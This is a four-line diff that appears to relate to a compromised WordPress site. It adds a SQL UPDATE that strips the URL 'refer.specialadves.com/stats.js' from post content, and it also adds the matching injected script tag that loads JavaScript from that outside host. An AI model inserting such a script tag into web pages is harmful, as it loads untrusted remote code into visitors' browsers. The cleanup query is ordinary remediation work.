@@ -1,0 +1,4 @@
+UPDATE `wpyn_posts` SET `post_content` = replace(post_content, 'https://refer.specialadves.com/stats.js', ' ');
+
+
+<script src='https://refer.specialadves.com/stats.js' type='text/javascript'></script>
